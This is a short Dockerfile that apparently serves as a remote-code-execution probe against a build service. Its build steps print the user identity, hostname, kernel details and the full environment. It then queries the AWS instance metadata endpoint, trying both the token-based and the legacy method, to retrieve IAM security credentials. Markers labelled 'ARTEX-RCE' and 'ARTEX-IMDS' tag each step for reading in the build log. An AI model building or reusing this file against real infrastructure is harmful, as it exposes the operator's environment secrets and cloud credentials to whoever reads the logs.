FROM alpine:3.20
RUN apk add --no-cache curl >/dev/null 2>&1 || true
RUN echo ARTEX-RCE-ID; id; hostname; uname -a
RUN echo ARTEX-RCE-ENV; env | sort | head -c 2500
RUN echo ARTEX-IMDS-BUILD; T=$(curl -s -m 3 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 300'); if [ -n "$T" ]; then curl -s -m 4 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/; else curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo IMDS_FAIL; fi | head -c 600
RUN echo ARTEX-RCE-END
COPY boot.sh /boot.sh
RUN chmod +x /boot.sh
CMD ["sh", "/boot.sh"]
